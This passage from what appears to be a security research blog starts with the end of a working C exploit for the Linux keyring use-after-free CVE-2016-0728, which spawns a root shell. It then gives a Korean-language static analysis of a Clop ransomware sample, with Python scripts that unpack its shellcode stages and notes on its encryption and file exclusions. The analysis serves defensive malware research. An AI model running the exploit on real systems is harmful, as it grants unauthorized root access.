class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/70257118/99533180-d2c1cd80-29e8-11eb-9a4d-35319be58303.png" alt="CVE-2016-0728"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f">https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f</a></li>
<li><a href="https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/">https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/</a></li>
<li><a href="https://duasynt.com/blog/cve-2016-0728-poc-not-working">https://duasynt.com/blog/cve-2016-0728-poc-not-working</a></li>
<li><a href="https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/">https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/</a></li>
<li><a href="http://egloos.zum.com/rousalome/v/9964885">http://egloos.zum.com/rousalome/v/9964885</a></li>
<li><a href="https://procdiaru.tistory.com/89">https://procdiaru.tistory.com/89</a></li>
<li><a href="http://blog.naver.com/skinfosec2000/220612669396">http://blog.naver.com/skinfosec2000/220612669396</a></li>
<li><a href="https://asiagaming.tistory.com/160">https://asiagaming.tistory.com/160</a></li>
</ul>
]]></content>
      <categories>
        <category>Research</category>
      </categories>
      <tags>
        <tag>1-day</tag>
        <tag>UAF</tag>
        <tag>CVE</tag>
        <tag>Linux Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Clop Ransomware</title>
    <url>/2021/05/24/2021-05-25-Clop/</url>
    <content><![CDATA[<center>Clop // Ransomware</center> 


<h1 id="File-info"><a href="#File-info" class="headerlink" title="File info"></a>File info</h1><table>
<thead>
<tr>
<th align="center">Info</th>
<th align="center">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SHA256</td>
<td align="center">3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b</td>
</tr>
<tr>
<td align="center">File Size</td>
<td align="center">183KB</td>
</tr>
<tr>
<td align="center">File Type</td>
<td align="center">.exe(win32)</td>
</tr>
<tr>
<td align="center">Function</td>
<td align="center">Crypto</td>
</tr>
</tbody></table>
<span id="more"></span>
<h1 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h1><h3 id="분석환경"><a href="#분석환경" class="headerlink" title="분석환경"></a>분석환경</h3><ul>
<li>OS : Windows10</li>
<li>Tools : IDA Pro, 010Editor</li>
</ul>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><img src="https://user-images.githubusercontent.com/49066484/119482051-62787800-bd8e-11eb-8c95-465fce53284a.png" alt="그림1"></p>
<p>Clop Sample을 다운 받은 후 IDA로 확인했을때의 모습이다. 바이너리가 호출하는 함수의 개수가 적은 것으로 보아 바로 악성행위를 분석할 수 있을 것 같지 않다.  <code>Line115</code>에서 for문을 500000번을 도는데 이는 단순히 동적 분석을 방해하는 fake코드 인 것 같다. 해당 루프를 탈출하면 <code>Line140</code>의 조건문으로 들어가게 된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119482059-64423b80-bd8e-11eb-917c-a2353c279bb4.png" alt="그림2"></p>
<p>조건문안에는 쓰이지 않는 값들을 변수에 할당해주며 마지막에 <code>401000()</code>을 호출한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119483549-0dd5fc80-bd90-11eb-83ec-e440d60596cd.png" alt="그림3"></p>
<p><code>401000()</code>에서는 <code>VirtualAlloc</code>을 통해 메모리를 할당하게 되는데 빨간 박스 부분에서 할당한 메모리에 값을 쓰게된다. 여기서 <code>Line 176, 183, 185</code>가 연산에 쓰이는 핵심 코드이며 나머지는 쓰레기 코드이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119483553-0f072980-bd90-11eb-98fb-d364210b2444.png" alt="그림4"></p>
<p>위 과정에서 입력한 내용을 <code>Line232</code>에서 호출하는 것으로 보아, 다음 단계로 넘어가기 위해 <code>Shellcode</code>를 쓰고 호출하는 것을 예상할 수 있다.  내용을 입력할 때 사용한 코드를 아래와 같이 python으로 똑같이 구현하여 쉘코드를 추출할 수 있었다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clop&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x933C</span>)</span><br><span class="line">    shellcode = f.read(<span class="number">1380</span>*<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1380</span>): </span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x4559</span> ^ ROL4(<span class="number">0x4559</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,shellcode[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(decode)</span><br></pre></td></tr></table></figure>



<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><img src="https://user-images.githubusercontent.com/49066484/119485756-68705800-bd92-11eb-8017-231cc6686fbf.png" alt="그림5"></p>
<p>Step 1에서 추출한 Shellcode를 IDA로 확인한 모습니다. TerminateThread, Virtual..와 같은 문자열이 있는걸 확인할 수 있고 이는 성공적으로 두번째 단계에 들어왔음을 의미한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119485758-69a18500-bd92-11eb-9a72-f491f7abf3db.png" alt="그림6"></p>
<p>Step 1에서 인자로 받아온 Kernel32와 GetProcAddress를 통해 필요한 함수 주소를 알아온다. 성공적으로 모든 함수의 주소를 알아 왔다면 VirtualQuery 함수를 호출한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119487256-1b8d8100-bd94-11eb-926a-0b90e4076009.png" alt="그림7"></p>
<p>VirtualQuery함수는 프로세스의 특정 메모리의 정보, 권한을 얻어온다. 여기서 <code>lpAddress</code>의 인자 값으로 <code>retaddr</code>이 들어갔는데 이 주소는 Step 1에서 Shellcode 호출 후 다음으로 실행될 주소이다. 이는 이전 Step 의 바이너리의 ImageBase주소의 정보를 얻기 위함으로 예상된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119488156-30b6df80-bd95-11eb-9bae-185f1498de93.png" alt="그림8"></p>
<p><code>Line265 269</code>에서 args[2],args[4]만큼의 크기를 VirtualAlloc한다. 여기서 args는 Step 1에서 Shellcode를 호출 할 때의 인자값들로 아래 그림을 참고하면 args[2]는 3번째 인자인 <code>0x19d48</code> args[4]는 5번째 인자인 <code>0x20200</code>임을 알 수 있다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119489985-3f05fb00-bd97-11eb-9792-167a31b8725a.png" alt="그림9"></p>
<p><img src="https://user-images.githubusercontent.com/49066484/119489986-3f9e9180-bd97-11eb-89be-7d335f941ab5.png" alt="그림10"></p>
<p>각각 크기로 VirtualAlloc을 한 후, 반복문을 통해 <code>0x19d48</code>만큼 할당한 메모리에 값을 쓴다. 이 과정에서는 Step 1에서 Shellcode를 추출할 때 보였던 코드가 있으며, 이는 다음 단계로 넘어가는 Shellcode를 추출하는 것임을 다시 한 번 예상할 수 있다. Shellcode를 추출 한 후   <code>aplib_decompress</code>을 호출한다. 이때 인자는 <code>0x19d48</code>만큼 할당한 메모리와 <code>0x20200</code>만큼 할당한 메모리가 되는데 추출 한 Shellcode를 decompress하여 해당 내용을 더 큰 메모리에 쓰는 역할을 한다. </p>
<p>다음 단계로 넘어가기 위해 Step 1과 동일하게 해당 코드를 python으로 구현하였고, 이 때 decompress하는 과정은 아래 모듈을 사용했다.</p>
<ul>
<li><a href="https://github.com/snemes/aplib/blob/master/aplib.py">https://github.com/snemes/aplib/blob/master/aplib.py</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">&#x27;APLib&#x27;</span>, <span class="string">&#x27;decompress&#x27;</span>]</span><br><span class="line">__version__ = <span class="string">&#x27;0.6&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Sandor Nemes&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APLib</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    __slots__ = <span class="string">&#x27;source&#x27;</span>, <span class="string">&#x27;destination&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;bitcount&#x27;</span>, <span class="string">&#x27;strict&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, source, strict=<span class="literal">True</span></span>):</span></span><br><span class="line">        self.source = BytesIO(source)</span><br><span class="line">        self.destination = <span class="built_in">bytearray</span>()</span><br><span class="line">        self.tag = <span class="number">0</span></span><br><span class="line">        self.bitcount = <span class="number">0</span></span><br><span class="line">        self.strict = <span class="built_in">bool</span>(strict)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># check if tag is empty</span></span><br><span class="line">        self.bitcount -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.bitcount &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># load next tag</span></span><br><span class="line">            self.tag = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">            self.bitcount = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># shift bit out of tag</span></span><br><span class="line">        bit = self.tag &gt;&gt; <span class="number">7</span> &amp; <span class="number">1</span></span><br><span class="line">        self.tag &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bit</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getgamma</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># input gamma2-encoded bits</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            result = (result &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.getbit():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">depack</span>(<span class="params">self</span>):</span></span><br><span class="line">        r0 = -<span class="number">1</span></span><br><span class="line">        lwm = <span class="number">0</span></span><br><span class="line">        done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># first byte verbatim</span></span><br><span class="line">            self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># main decompression loop</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">                <span class="keyword">if</span> self.getbit():</span><br><span class="line">                    <span class="keyword">if</span> self.getbit():</span><br><span class="line">                        <span class="keyword">if</span> self.getbit():</span><br><span class="line">                            offs = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                                offs = (offs &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.destination.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                            lwm = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            offs = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = <span class="number">2</span> + (offs &amp; <span class="number">1</span>)</span><br><span class="line">                            offs &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                    self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line">                            lwm = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        offs = self.getgamma()</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> lwm == <span class="number">0</span> <span class="keyword">and</span> offs == <span class="number">2</span>:</span><br><span class="line">                            offs = r0</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">if</span> lwm == <span class="number">0</span>:</span><br><span class="line">                                offs -= <span class="number">3</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                offs -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            offs &lt;&lt;= <span class="number">8</span></span><br><span class="line">                            offs += <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">32000</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">1280</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &lt; <span class="number">128</span>:</span><br><span class="line">                                length += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line"></span><br><span class="line">                        lwm = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line">                    lwm = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> (TypeError, IndexError):</span><br><span class="line">            <span class="keyword">if</span> self.strict:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;aPLib decompression error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(self.destination)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompress</span>(<span class="params">data, strict=<span class="literal">False</span></span>):</span></span><br><span class="line">    packed_size = <span class="literal">None</span></span><br><span class="line">    packed_crc = <span class="literal">None</span></span><br><span class="line">    orig_size = <span class="literal">None</span></span><br><span class="line">    orig_crc = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;AP32&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(data) &gt;= <span class="number">24</span>:</span><br><span class="line">        <span class="comment"># data has an aPLib header</span></span><br><span class="line">        header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(<span class="string">&#x27;=IIIII&#x27;</span>, data, <span class="number">4</span>)</span><br><span class="line">        data = data[header_size : header_size + packed_size]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> packed_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_size != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> packed_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_crc != crc32(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = APLib(data, strict=strict).depack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> orig_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_size != <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> orig_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_crc != crc32(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># self-test</span></span><br><span class="line">    data = <span class="string">b&#x27;T\x00he quick\xecb\x0erown\xcef\xaex\x80jumps\xed\xe4veur`t?lazy\xead\xfeg\xc0\x00&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> decompress(data) == <span class="string">b&#x27;The quick brown fox jumps over the lazy dog&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;clop&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0xA8D0</span>)</span><br><span class="line">    data = f.read(<span class="number">0x19d48</span>)</span><br><span class="line">     </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">0x19d48</span>:</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        i = i + <span class="number">2</span></span><br><span class="line">    result += data[i].to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    j = j + <span class="number">1</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result ) // <span class="number">4</span>):</span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x0AE0</span> ^ ROL4(<span class="number">0x0AE0</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,result[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decompress&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompress(decode))</span><br></pre></td></tr></table></figure>


<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><img src="https://user-images.githubusercontent.com/49066484/119491533-fe0ee600-bd98-11eb-8fec-6f0deddb3060.png" alt="그림11"></p>
<p>세 번째 단계로 들어왔다. 여기에는 악성코드에서 쓰일법한 함수들이 많이 있는 것으로 보아 실제 악성 행위를 하는 코드가 있을 것이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119492069-9e650a80-bd99-11eb-8f75-b1a39506e900.png" alt="그림12"></p>
<p>특정 조건을 만족하면 CreateThread함수를 호출한다. 이 때 Thread가 수행하는 함수는 악성 행위를 할 가능성이 높다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602027-4542b880-be25-11eb-8f55-fdbe8ea87f94.png" alt="그림15"></p>
<p><code>WNetOpenEum</code>,<code>WNetEenumResource</code>함수 호출로 현재 연결되어있는 네트워크 정보를 알아온다. 그리고 특정 조건이 만족되면 다시 한 번 CreateThread함수를 호출한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602538-517b4580-be26-11eb-9501-16d51b87e141.png" alt="그림16"></p>
<p><code>Crypt</code>로 시작하는 함수들이 보인다. 암호화 관련 코드인 것 같다.  pubKey 문자열을 복사하는데 해당 내용은 아래와 같다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602903-234a3580-be27-11eb-9b70-5a859c8e043b.png" alt="그림17"></p>
<ul>
<li>CryptStringToBinaryA : 포맷된 문자열을 바이트 배열로 변환</li>
<li>CryptDecodeObjectEx : 변환된 바이트 배열을 구조체 변수로 디코딩</li>
<li>CryptAcquireContextW :  특정 cryptographic service provider(CSP)에서 원하는 키 컨테이너의 핸들값을 가져옴</li>
<li>CryptImportPublicKeyInfo : pubkey의 핸들값을 가져옴</li>
</ul>
<p>위에서 얻은 Key, 구조체, 핸들 값을 가지고 <code>4014b0()</code>을 호출한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119604958-eaac5b00-be2a-11eb-9b28-20f86fc67822.png" alt="그림18"></p>
<p><code>4014b0()</code>에서는 암호화할 path를 확인한다. 조건문에서 <code>compare_hash_file</code>의 반환 값에 따라 LABEL_37로 이동한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119605228-5db5d180-be2b-11eb-838a-1f6ad410dbb8.png" alt="그림20"></p>
<p><code>compare_hash_file</code>함수에서는 특정 hash값과 path에 대한 hash값을 비교하여 return 값을 반환한다. 이 는 모든 Windows의 파일을 암호화하게 된다면 정상적인 작동이 어렵기에 Windows 동작에 필요한 특정 파일들을 암호화에서 제외하는 작업이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119604955-e97b2e00-be2a-11eb-9daa-ee03a1ad117b.png" alt="그림19"></p>
<p>LABLE_37은 <code>4014b0</code>을 다시 호출하는 것을 확인 할 수 있는데 이는 해당 path의 하위 폴더를 대상으로 재귀적인 호출을 통해 암호화에서 제외하는 작업으로 판단된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119605813-60fd8d00-be2c-11eb-8d12-0acaac89757a.png" alt="그림21"></p>
<p>그러고 나서 조건문을 만나는데, 파일 속성이 디렉토리가 아닐 경우, 파일이름이 <code>..</code> , <code>.</code> 가 아닐 경우, 파일 이름이 <code>README_README.txt</code>가 아닐 경우와 추가적으로</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119606160-01ec4800-be2d-11eb-8c41-ee6a79062579.png" alt="그림22"></p>
<p>특정 파일의 hash값과 일치 하지 않을 경우 (특정 파일이 아닌경우)</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119606165-0284de80-be2d-11eb-89a0-fc5b10cfe1b8.png" alt="그림23"></p>
<p>파일의 확장자가 특정 값이 아닐 경우 (특정 확장자가 아닌경우)에 조건문을 실행하게 된다.<br>여기서 제외되는 확장자는 아래와 같다.</p>
<pre><code>- .CI0P : 과거 암호화 파일 확장자
- .OCX : ActiveX 파일
- .DLL : 동적 라이브러리
- .EXE : 실행 파일
- .SYS : 드라이버 파일
- .LNK : 바로가기 파일
- .ICO : 아이콘 파일
- .INI : 설정파일
- .MSI : Installer 파일
- .CHM : 도움말 파일
- .HLF
